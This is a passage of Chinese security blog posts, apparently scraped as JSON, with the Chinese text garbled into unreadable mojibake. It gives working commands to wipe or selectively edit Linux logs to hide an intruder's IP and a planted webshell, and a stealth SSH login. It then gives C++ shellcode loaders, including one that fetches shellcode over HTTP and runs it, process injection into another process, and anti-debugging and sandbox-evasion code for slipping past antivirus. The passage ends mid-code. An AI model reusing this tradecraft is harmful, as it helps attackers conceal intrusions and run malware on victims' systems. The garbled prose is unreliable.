è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½¿ç”¨w,who,usersç­‰å‘½ä»¤æŸ¥çœ‹~/.bash_history æ‰§è¡Œçš„å‘½ä»¤,ç”¨ histroy -c å³å¯åˆ é™¤ æ¸…ç©ºæ—¥å¿—æ¸…é™¤ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´ï¼šecho &gt; /var/log/lastlog #lastlogå‘½ä»¤æ¸…é™¤å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼šecho &gt; /var/log/utmp #ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¸…é™¤å®‰å…¨æ—¥å¿—è®°å½•ï¼šcat /dev/null &gt; /var/log/secureæ¸…é™¤ç³»ç»Ÿæ—¥å¿—è®°å½•ï¼šcat /dev/null &gt; /var/log/message è¯¸å¦‚æ­¤ç±»â€¦ æ›¿æ¢/åˆ é™¤éƒ¨åˆ†æ—¥å¿—æ—¥å¿—æ–‡ä»¶è¢«æ¸…ç©ºä¼šå¼•èµ·ç®¡ç†å‘˜è­¦è§‰ï¼Œæ‰€ä»¥å¯ä»¥åªæ›¿æ¢æˆ–åˆ é™¤å…³é”®ä¿¡æ¯ï¼Œå®ç°éšç§˜æ”»å‡»çš„ç›®çš„ã€‚ # åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ipsed -i &#39;&#x2F;è‡ªå·±çš„ip&#x2F;&#39;d &#x2F;var&#x2F;log&#x2F;messages# å…¨å±€æ›¿æ¢ç™»å½•IPåœ°å€ï¼šsed -i &#39;s&#x2F;192.168.166.85&#x2F;192.168.1.1&#x2F;g&#39; secureå¯¹äºWEBæœåŠ¡è¿˜å¯ä»¥è¿™æ ·éšè—æˆ‘ä»¬çš„é©¬# ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤,cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log | grep -v evil.php &gt; tmp.log# æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶cat tmp.log &gt; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F; å½»åº•åˆ é™¤shred-n æŒ‡å®šè¦†å†™æ¬¡æ•°ï¼Œé»˜è®¤3æ¬¡ shred -f -u -z -v -n 8 1.txt ddè¿™ä¸ªå‘½ä»¤ç”¨äºæ¸…ç©ºæ–‡ä»¶ dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;è¦åˆ é™¤çš„æ–‡ä»¶ wipeå¾ˆç®€å•æ˜“ç”¨ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸æ˜¯è£…æœºè‡ªå¸¦ wipe filename Secure-Deletesecure-deleteæ˜¯ä¸€ä¸ªé›†æˆåŒ–å·¥å…·åŒ…ï¼Œæ”¶å½•äº†äº›å®‰å…¨åˆ é™¤æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ srm filenamesfill &#x2F;a ç”¨éšæœºæ•°å¡«å……ç©ºé—²æˆ–è€…å¯ç”¨çš„ç©ºé—´ï¼Œä¿è¯æ²¡æœ‰å¯æ¢å¤çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ sswapç”¨äºå®‰å…¨åœ°æ¸…é™¤äº¤æ¢åˆ†åŒºã€‚ cat &#x2F;proc&#x2F;swaps æ‰¾åˆ°äº¤æ¢åˆ†åŒº sswap &#x2F;www&#x2F;swap smemç”¨äºæ¸…ç†åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼Œæä¾›å®‰å…¨åœ°å†…å­˜æ¸…ç†: smem SSHéšèº«ç™»å½•ssh -T &#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#57;&#x39;&#46;&#49;&#x32;&#51; /usr/bin/bash -i -Tè¡¨ç¤ºä¸åˆ†é…ä¼ªç»ˆç«¯ï¼Œ/usr/bin/bash -i è¡¨ç¤ºåœ¨ç™»å½•åè°ƒç”¨bashå‘½ä»¤ -i è¡¨ç¤ºæ˜¯äº¤äº’å¼shelï¼Œè¿™æ ·ç™»é™†å°†ä¸ä¼šåœ¨w/lastå‘½ä»¤ç»“æœä¸­æ˜¾ç¤º. ä½†æ˜¯ä¼šè¢«lsof -i:22 å’Œ ps |grep ssh ç­‰å‘½ä»¤å‘ç°","categories":[],"tags":[{"name":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","slug":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","permalink":"http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"}]},{"title":"åŸºç¡€å…æ€æ‰‹æ³•æš´é£å¸å…¥","slug":"åŸºç¡€å…æ€æ‰‹æ³•æš´é£å¸å…¥","date":"2021-09-03T13:08:31.882Z","updated":"2021-09-03T13:18:40.381Z","comments":true,"path":"2021/09/03/åŸºç¡€å…æ€æ‰‹æ³•æš´é£å¸å…¥/","link":"","permalink":"http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/","excerpt":"","text":"å‰é¢çš„è¯:â€å…æ€ä¸€èˆ¬éƒ½æ˜¯é ç»„åˆæ‹³â€ EXEåŠ å£³æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚å¯ä»¥è‡ªå†™åŠ å£³å™¨ç­‰ç­‰ æ·»åŠ æ•°å­—ç­¾åä¸åŒçš„æ€è½¯å¯¹æ•°å­—ç­¾åçš„æ•æ„Ÿæ€§ä¸åŒï¼Œæœ‰äº›æ€è½¯å¯èƒ½åªæ£€æŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰æ•°å­—ç­¾åå°±è¿‡äº†ï¼Œæœ‰äº›æ€è½¯å¯èƒ½è¦å»éªŒè¯ä¸€ä¸‹æ•°å­—ç­¾åçš„æ­£ç¡®æ€§ï¼Œæœ‰äº›å¯èƒ½ç®¡éƒ½ä¸ç®¡æ•°å­—ç­¾åã€‚åªèƒ½è¯´æ·»åŠ æ•°å­—ç­¾åèƒ½ç¨å¾®æå‡ä¸€ä¸‹exeçš„å…æ€å‡ ç‡ã€‚ é—´æ¥è¿è¡Œexeå¹³æ—¶æˆ‘ä»¬è¿è¡Œä¸€ä¸ªexeï¼š cmd /c c:\\a.exe ä½†è¿™æ ·å®¹æ˜“è¢«æ€æˆ–è€…å‘½ä»¤è¢«banã€‚æ‰€æœ‰å°±æœ‰ä¸€äº›é—´æ¥è¿è¡Œexeçš„æ–¹æ³• forfilesforfilesæ˜¯ä¸€ä¸ªç”¨äºæ‰¹å¤„ç†çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒåœ¨æ‰¾åˆ°æ–‡ä»¶åä¼šæ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤. forfiles &#x2F;p æŒ‡å®šæœç´¢æ–‡ä»¶çš„ç›®å½• &#x2F;m æŒ‡å®šæœç´¢å…³é”®è¯ &#x2F;c æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤forfiles &#x2F;p c:\\windows\\system32 &#x2F;m calc.exe &#x2F;c c:\\tmp\\evil.exe &#x2F;&#x2F;evil.exeä¼šæˆä¸ºforfiles.exeçš„å­è¿›ç¨‹ pcaluapcalua -a c:\\tmp\\evil.exe &#x2F;&#x2F;evil.exeä¸ä¼šæˆä¸ºå­è¿›ç¨‹ cmd Hijackä¸‹é¢å‘½ä»¤å°†å¼¹è®¡ç®—å™¨ cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;cmd.exe &#x2F;c &quot;ping ;a.exe; 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;ping ;a.exe 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe conhostå¤§äºwin7å¯ç”¨ conhost c:\\windows\\system32\\calc.execonhost adsadas&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exeä»¥ä¸‹æŒ‡ä»¤win10æŸäº›ç‰ˆæœ¬æ— æ³•ä½¿ç”¨conhost &quot;asddas c:\\windows\\system32\\calc.exe&quot; explorer.exeexplorer.exe c:\\windows\\system32\\calc.exeexplorer asdsadasd,&quot;c:\\windows\\system32\\calc.exe&quot; C++shellcodeå¤„ç†æŒ‡é’ˆæ‰§è¡Œ+ç”³è¯·å†…å­˜åŠ¨æ€åŠ è½½shellcodeé¦–å…ˆä»cobalt strikeä¸Šç”Ÿæˆæ‹¿åˆ°shellcodeç”¨ä½œæœ¬æ¬¡æµ‹è¯•ã€‚ç„¶åé€šè¿‡ä¸‹é¢çš„ä»£ç ï¼Œç›´æ¥æ‰§è¡Œå†™æ­»åœ¨ç¨‹åºé‡Œçš„shellcodeã€‚ #include &lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123; unsigned char buf[] &#x3D; &quot;shellcode&quot;; void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buf, sizeof buf); ((void(*)())exec)(); return 0;&#125; å¯ä»¥çœ‹è§ï¼Œè¿˜æ˜¯å¾ˆæ‹‰è·¨çš„ã€‚ å†…è”æ±‡ç¼–åŠ è½½shellcodec++æœ‰å¼ºå¤§çš„å†…è”æ±‡ç¼–åŠŸèƒ½ï¼Œä¸Šæ¬¡å†™å£³çš„æ—¶å€™å°±æ„Ÿå—äº†ä¸€ç•ªã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å†…è”æ±‡ç¼–ä»£ç åŠ è½½shellcode.é¡ºä¾¿åŠ èŠ±ä»€ä¹ˆçš„ï¼Œéƒ½å¯ä»¥å¼„ã€‚ #include &lt;iostream&gt;#include&lt;Windows.h&gt;#include&lt;winhttp.h&gt;#pragma comment(lib, &quot;winhttp.lib&quot;)#pragma comment(lib,&quot;user32.lib&quot;)int main()&#123; unsigned char buf[] &#x3D; &quot;shellcode&quot;; _asm &#123; lea eax, buf; jmp eax; &#125;&#125; è¿˜æ˜¯è›®æ‹‰è·¨çš„ï¼Œè™½ç„¶æˆ‘æ²¡æœ‰åŠ èŠ±ã€‚ HTTPåè®®è¿œç¨‹è¯»å–shellcodeè¿™æ¬¡æˆ‘ä»¬ä¸æŠŠshellcodeå†™æ­»åœ¨ç¨‹åºä¹‹ä¸­ï¼Œè€Œæ˜¯é€šè¿‡ç¨‹åºå‘èµ·httpè¯·æ±‚å‘å¤–ç•Œè·å¾—shellcodeå¹¶æ‰§è¡Œã€‚è¿™é‡Œæ¶‰åŠåˆ°winhttp.hçš„ä¸€äº›å‡½æ•°çš„ä½¿ç”¨ã€‚ æºç å€Ÿç”¨ä¸€ä¸‹ å¿ çš„ä»£ç ã€‚å®ƒçš„ä»£ç æ˜¯ç›´æ¥æŠŠshellcodeçš„åå…­è¿›åˆ¶ä»¥å­—ç¬¦ä¸²å½¢å¼ç›´æ¥æ”¾åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚åƒè¿™æ · #include &lt;string&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winhttp.h&gt;#pragma comment(lib,&quot;winhttp.lib&quot;)#pragma comment(lib,&quot;user32.lib&quot;)using namespace std;void main()&#123; DWORD dwSize &#x3D; 0; DWORD dwDownloaded &#x3D; 0; LPSTR pszOutBuffer &#x3D; NULL; HINTERNET hSession &#x3D; NULL, hConnect &#x3D; NULL, hRequest &#x3D; NULL; BOOL bResults &#x3D; FALSE; hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); if (hSession) &#123; hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0); &#125; if (hConnect) &#123; hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); &#125; LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;; SIZE_T len &#x3D; lstrlenW(header); WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD); if (hRequest) &#123; std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;; const void *ss &#x3D; (const char *)data.c_str(); bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0); &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 ); &#125; if (bResults) &#123; bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL); &#125; if (bResults) &#123; do &#123; &#x2F;&#x2F; Check for available data. dwSize &#x3D; 0; if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize)) &#123; printf(&quot;Error %u in WinHttpQueryDataAvailable.\\n&quot;, GetLastError()); break; &#125; if (!dwSize) break; pszOutBuffer &#x3D; new char[dwSize + 1]; if (!pszOutBuffer) &#123; printf(&quot;Out of memory\\n&quot;); break; &#125; ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123; printf(&quot;Error %u in WinHttpReadData.\\n&quot;, GetLastError()); &#125; else &#123; printf(&quot;ok&quot;); &#125; &#x2F;&#x2F;char ShellCode[1024]; int code_length &#x3D; strlen(pszOutBuffer); char* ShellCode &#x3D; (char*)calloc(code_length &#x2F;2 , sizeof(unsigned char)); for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123; sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]); pszOutBuffer +&#x3D; 2; &#125; printf(&quot;%s&quot;, ShellCode); &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer); void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, ShellCode, sizeof ShellCode); ((void(*)())exec)(); delete[] pszOutBuffer; if (!dwDownloaded) break; &#125; while (dwSize &gt; 0); &#125; if (hRequest) WinHttpCloseHandle(hRequest); if (hConnect) WinHttpCloseHandle(hConnect); if (hSession) WinHttpCloseHandle(hSession); system(&quot;pause&quot;);&#125; å¤§è‡´æµç¨‹ä¾¿æ˜¯: 1.é€šè¿‡winhttpä¸­çš„å‡½æ•°ï¼Œä»¥HTTPçš„æ–¹æ³•è·å–è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„shellcodeï¼ˆæ­¤æ—¶shellcodeåœ¨å†…å­˜ä¸­æ˜¯æŒ‰ç…§ç¼–ç ç»“æœå­˜å‚¨çš„ï¼Œå¦‚ä¸‹å›¾ï¼Œå·¦è¾¹æ˜¯å†…å­˜åŸæ–‡ï¼Œå³è¾¹æ˜¯å†…å­˜è§£ç ï¼ˆshellcodeï¼‰ï¼‰ 2.å¼€è¾Ÿä¸€æ®µå†…å­˜ï¼Œç„¶åé€šè¿‡sscanfç­‰æ–¹æ³•è¯»å–å­˜å‚¨shellcodeå˜é‡çš„å†…å®¹ï¼Œå°†å†…å­˜è§£ç ä¿¡æ¯å½•å…¥æ–°çš„å†…å­˜ç©ºé—´,ä½¿shellcodeå­˜åœ¨äºå†…å­˜ä¸­3.æ‰§è¡Œshellcodeï¼Œå¯ä»¥ç”¨æŒ‡é’ˆæ‰§è¡Œç­‰æ–¹æ³•æ‰§è¡Œã€‚ ä½¿ç”¨åŠ è½½å™¨åŠ è½½shellcodeshellcode_ launcher åŠ è½½å™¨https://github.com/clinicallyinane/shellcode_launcher/ ç”¨msfæˆ–è€…csç”Ÿæˆrawå½¢å¼shellcodeï¼Œç„¶åä½¿ç”¨è¿™ä¸ªåŠ è½½å™¨åŠ è½½ä¸€ä¸‹å°±è¡Œäº†.åƒè¿™æ · shellcode_launcher.exe -i C:\\payload32.binshellcode_ launcher åœ¨virustotalä¸ŠæŠ¥æ¯’ç‡ä¹Ÿæ˜¯å¾ˆé«˜å¾ˆé«˜äº†â€¦ SSI åŠ è½½å™¨https://github.com/DimopoulosElias/SimpleShellcodeInjector csç”Ÿæˆcå½¢å¼shellcodeï¼Œç„¶åå»é™¤\\xï¼Œå†æ‹¿ç»™ssiåŠ è½½å™¨åŠ è½½,åƒè¿™æ · ssi.exe shellcode å³å¯å®ŒæˆåŠ è½½ ssiåœ¨virustotalä¸ŠæŠ¥æ¯’ç‡ä¹Ÿæ˜¯éå¸¸é«˜.. è‡ªå†™åŠ è½½å™¨ssiæºç å¾ˆç®€å•å¤§å®¶å¯ä»¥å‚è€ƒå†™ä¸€ä¸‹ shellcodeå˜å½¢å¤§æ€è·¯å°±æ˜¯æŠŠshellcodeæ··æ·†åï¼Œæ”¾å…¥åŠ è½½å™¨åŠ è½½è¿è¡Œã€‚å…¶ç»†åˆ†æ€è·¯å°±åŒ…æ‹¬æ€ä¹ˆæŠŠshellcodeè¿›è¡Œæ··æ·†äº†ï¼Œç®€å•çš„æœ‰XOR,BASE64ï¼Œå¤æ‚ä¸€ç‚¹çš„æœ‰AESç­‰ã€‚è¿™é‡Œå°±åªè¯´è¯´xorã€‚é¦–å…ˆæˆ‘ä»¬å¾—å‡†å¤‡ä¸€ä¸ªç¨‹åºå°†shellcodeè¿›è¡Œæ··æ·†ã€‚å›¾æ–¹ä¾¿å°±æ‹¿pythonå†™ä¹Ÿæ˜¯è›®ä¸é”™çš„ã€‚éšä¾¿å†™äº†ä¸€ä¸ªã€‚æ•ˆæœçœŸä¸æˆ³ï¼ˆè™½ç„¶ä¸Šä¼ äº†vtè¿‡ä¸¤å¤©å°±è‚¯å®šä¸èƒ½ç”¨äº†) github:https://github.com/ConsT27/SimpleXORshellcode shellcodeæ³¨å…¥è¿›ç¨‹å†…å­˜æ³¨å…¥å·²æœ‰è¿›ç¨‹å¤§è‡´é€»è¾‘:OpenProcessè·å¾—è¿›ç¨‹å¥æŸ„-&gt;VirtualAllocExåœ¨è¿›ç¨‹ä¸­å¼€è¾Ÿä¸€æ®µå†…å­˜ç©ºé—´-&gt;WriteProcessMemoryå‘åˆšåˆšå¼€è¾Ÿçš„å†…å­˜ç©ºé—´ä¸­å†™å…¥shellcode-&gt;CreateRemoteThreadä¸ºåˆšåˆšå†™å…¥çš„shellcodeåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ #include &lt;iostream&gt;#include&lt;Windows.h&gt;int main()&#123; unsigned char buf[] &#x3D; &quot;shellcode&quot;; DWORD pid &#x3D; 25388; HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!Proc) &#123; std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); if (buffer) &#123; std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123; std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);&#125; æ•ˆæœ:è™½ç„¶ä¹Ÿå¾ˆæ‹‰ï¼Œä½†æ˜¯é™æ€è¿‡äº†è¶‹åŠ¿æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ã€‚ åè°ƒè¯•å¯ä»¥é€šè¿‡åè°ƒè¯•æ¥è§„é¿æ€è½¯æ£€æµ‹ï¼Œæ‹–æ…¢é€†å‘å·¥ç¨‹å¸ˆåˆ†æé€Ÿåº¦ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½æé«˜è¢«åˆ¤ä¸ºæ¶æ„æ–‡ä»¶çš„æ¦‚ç‡ã€‚ ç›´æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè°ƒè¯•çŠ¶æ€if (IsDebuggerPresent()) return FALSE;PPEB pPEB &#x3D; (PPEB)__readgsqword(0x60);if (pPEB-&gt;BeingDebugged) return;BOOL ret; CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret); return ret; NtQueryInformationProcessè¿™ä¸ªå‡½æ•°ç”¨æ¥è·å–æŸè¿›ç¨‹çš„ä¿¡æ¯ã€‚éœ€è¦åŠ¨æ€é“¾æ¥åº“ #pragma comment(lib,&quot;ntdll&quot;)å½“ç„¶ä¹Ÿå¯ä»¥ç”¨GetProcAddressåŠ¨æ€è·å–è¿™ä¸ªå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šè¿›ç¨‹å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¿›ç¨‹çš„ç‰¹å®šç»“æ„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è·å–è¿”å›å€¼ï¼Œç¬¬å››ä¸ªå‚æ•°æ˜¯è¿”å›å€¼ç¼“å†²åŒºå¤§å°ï¼Œç¬¬äº”ä¸ªå¡«NULLå…¶ä¸­ä¸åè°ƒè¯•æœ‰å…³çš„æˆå‘˜æœ‰ProcessDebugPort(0x7)ã€ProcessDebugObjectHandle(0x1E)å’ŒProcessDebugFlags(0x1F)ProcessDebugPortå‚æ•°ï¼Œè‹¥æ²¡åœ¨è°ƒè¯•ä¸­ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›0ï¼Œè‹¥åœ¨è°ƒè¯•ä¸­åˆ™è¿”å›å¯¹åº”çš„è°ƒè¯•ç«¯å£å…¶ä»–å‚æ•°ä¹Ÿç±»ä¼¼çœ‹é›ªä¸Šhoujingyiå¸ˆå‚…çš„æ¼”ç¤ºä»£ç BOOL CheckDebug() &#123; int debugPort &#x3D; 0; HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;); NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;); NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL); return debugPort !&#x3D; 0; &#125; BOOL CheckDebug() &#123; HANDLE hdebugObject &#x3D; NULL; HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;); NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;); NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL); return hdebugObject !&#x3D; NULL; &#125; BOOL CheckDebug() &#123; BOOL bdebugFlag &#x3D; TRUE; HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;); NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;); NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL); return bdebugFlag !&#x3D; TRUE; &#125; æ£€æµ‹è½¯ä»¶æ–­ç‚¹å½“æˆ‘ä»¬åœ¨è°ƒè¯•å™¨ä¸­å¯¹ä¸€è¡Œä»£ç æ‰“ä¸Šæ–­ç‚¹æ—¶ï¼Œå®è´¨ä¸Šæ˜¯å°†è¿™è¡Œä»£ç æ”¹ä¸ºäº†0xccï¼Œå³INT 3ï¼Œä¸­æ–­å¼‚å¸¸ï¼Œæ‰€ä»¥è°ƒè¯•å™¨è¿è¡Œåˆ°æ­¤å¤„æ—¶ä¼šåœæ­¢ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ£€æµ‹ä»£ç ä¸­æ˜¯å¦æœ‰0xccæ¥åˆ¤æ–­æ˜¯å¦è¢«æ‰“ä¸Šäº†è½¯ä»¶æ–­ç‚¹ï¼Œä»è€Œèµ·åˆ°åè°ƒè¯•çš„ä½œç”¨ã€‚ è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨æ±‡ç¼–ä»£ç ä¸­çš„ repne scasb æŒ‡ä»¤ï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¼“å†²åŒºçš„èµ·å§‹åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¼“å†²åŒºå¤§å°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚å®ƒä¼šåœ¨æŒ‡å®šçš„ç¼“å†²åŒºå†…å¯»æ‰¾å­—ç¬¦ä¸²ï¼Œè‹¥æ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›. æ—¶é—´æ£€æµ‹int t1 &#x3D; GetTickCount64();Hack(); &#x2F;&#x2F;ä¸€ä¸ªå‡½æ•°ï¼Œè¯±å¯¼åˆ†æäººå‘˜åœ¨è°ƒè¯•çš„æ—¶å€™è·Ÿè¿›è¿›å»è€½è¯¯æ—¶é—´int t2 &#x3D; GetTickCount64();if (((t2 - t1) &#x2F; 1000) &gt; 5) &#123;return FALSE;&#125; &#x2F;&#x2F;t1,t2æ£€æµ‹æ—¶é—´è¿‡å¤§åˆ™ä¼šæ˜¯è°ƒè¯•wprintf_s(L&quot;Now hacking more...\\n&quot;);ä¹Ÿå¯ä»¥ç”¨å†…è”æ±‡ç¼–å®ŒæˆBOOL CheckDebug() &#123; DWORD time1, time2; __asm &#123; rdtsc mov time1, eax ........åƒåœ¾ä»£ç ï¼Œè€½è¯¯åˆ†æäººå‘˜æ—¶é—´ rdtsc mov time2, eax &#125; if (time2 - time1 &lt; 0xff) &#123; return FALSE; &#125; else &#123; return TRUE; &#125; &#125; æ£€æµ‹çˆ¶è¿›ç¨‹è§æ²™ç®±ç»•è¿‡ç« èŠ‚ä¸­çš„â€œæ£€æµ‹çˆ¶è¿›ç¨‹â€ SEHä¸­æ–­ä¸æ˜¯å¾ˆæ‡‚ void AD_BreakPoint() &#123; printf(&quot;SEH : BreakPoint\\n&quot;); __asm &#123; &#x2F;&#x2F; install SEH push handler push DWORD ptr fs:[0] mov DWORD ptr fs:[0], esp &#x2F;&#x2F; generating exception int 3 &#x2F;&#x2F; 1) debugging &#x2F;&#x2F; go to terminating code mov eax, 0xFFFFFFFF jmp eax &#x2F;&#x2F; process terminating!!! &#x2F;&#x2F; 2) not debugging &#x2F;&#x2F; go to normal code handler: mov eax, dword ptr ss:[esp+0xc] mov ebx, normal_code mov dword ptr ds:[eax+0xb8], ebx xor eax, eax retn normal_code: &#x2F;&#x2F; remove SEH pop dword ptr fs:[0] add esp, 4 &#125; printf(&quot; &#x3D;&gt; Not debugging...\\n\\n&quot;); &#125; int _tmain(int argc, TCHAR* argv[]) &#123; AD_BreakPoint(); return 0; &#125; æ²™ç®±ç»•è¿‡ï¼ˆSandbox Evasionï¼‰System Checksæ£€æµ‹å½“å‰ç¯å¢ƒæ˜¯å¦æ˜¯æ²™ç®±ç¯å¢ƒï¼Œå¦‚æœæ˜¯æ²™ç®±åˆ™ä¸è¡¨ç°å‡ºæ¶æ„è¡Œä¸ºã€‚ æ£€æµ‹å‡½æ•°æ˜¯å¦è¢«HOOKæ›´æ”¹æœ‰äº›æ²™ç®±ä¼šå¯¹ä¸€äº›å‡½æ•°è¿›è¡ŒHOOKæ›´æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨åŸDLLä¸­æŸ¥æ‰¾åŸå‡½æ•°ä¸è¿›ç¨‹ä¸­çš„å‡½æ•°è¿›è¡Œæ¯”å¯¹ä»è€Œåˆ¤æ–­å…¶æ˜¯å¦è¢«HOOK.è¿™é‡Œæ˜¯åˆ«äººçš„ä»£ç (RedTeaming) &#x2F;&#x2F; manually load the dllHANDLE dllFile &#x3D; CreateFileW(L&quot;C:\\\\Windows\\\\System32\\\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);DWORD dllFileSize &#x3D; GetFileSize(dllFile, NULL);HANDLE hDllFileMapping &#x3D; CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);HANDLE pDllFileMappingBase &#x3D; 